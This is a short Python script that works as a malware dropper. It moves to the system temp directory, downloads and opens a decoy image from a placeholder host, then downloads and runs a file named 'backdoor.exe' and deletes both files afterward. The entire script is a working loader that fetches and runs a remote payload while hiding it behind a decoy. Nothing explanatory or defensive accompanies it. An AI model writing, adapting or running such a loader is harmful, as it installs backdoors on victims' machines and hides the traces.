#!/usr/bin/env python

import requests
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://ip/image.jpg")
subprocess.Popen("image.jpg", shell=True)
download("http://ip/backdoor.exe")
subprocess.call("backdoor.exe", shell=True)

os.remove("image.jpg")
os.remove("backdoor.exe")
